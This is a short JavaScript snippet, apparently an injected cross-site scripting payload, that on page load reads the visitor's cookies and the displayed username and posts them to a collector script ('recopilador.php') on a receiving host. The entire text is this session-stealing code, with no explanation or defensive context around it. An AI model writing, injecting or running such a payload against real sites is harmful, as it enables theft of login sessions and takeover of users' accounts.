<script languague="javascript">
$(document).ready(function(){
	var cookie = document.cookie;
	var usuario = $("#nombre_usuario").html().trim();
	$.ajax({
		type:"post",
		url:"localhost/receptor/recopilador.php",
		data:{
			"cookie":cookie,
			"usuario":usuario
			}
		});
});
</script>
